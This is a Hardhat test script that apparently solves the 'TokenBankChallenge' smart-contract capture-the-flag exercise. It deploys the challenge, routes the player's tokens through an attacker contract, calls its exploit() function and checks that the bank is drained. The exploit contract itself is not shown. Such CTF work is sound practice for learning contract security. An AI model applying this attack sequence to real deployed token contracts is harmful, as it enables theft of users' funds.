const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("TokenBankChallenge", async function () {
  let contract;
  let tokenContract;

  before(async function () {
    [owner, addr1] = await ethers.getSigners();
    contract = await (await ethers.getContractFactory("TokenBankChallenge")).deploy(addr1.address);
    tokenContract = (await ethers.getContractFactory("SimpleERC223Token")).attach(
      await contract.token()
    );
  });

  it("Exploit", async function () {
    const hackingContract = await (
      await ethers.getContractFactory("hackingTokenBankChallenge")
    ).deploy(contract.address);

    const initialAmount = await contract.balanceOf(addr1.address);

    //withdraw tokens from bank
    await contract.connect(addr1).withdraw(initialAmount);

    //transfer tokens from player(addr1) to hackingContract
    await tokenContract
      .connect(addr1)
      [`transfer(address,uint256)`](hackingContract.address, initialAmount);

    expect(await tokenContract.balanceOf(hackingContract.address)).to.equal(initialAmount);

    //transfer tokens from hackingContract to bank contract
    await hackingContract.connect(addr1).bankDeposit(initialAmount);

    expect(await contract.balanceOf(hackingContract.address)).to.equal(initialAmount);

    //exploit
    await hackingContract.exploit();
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
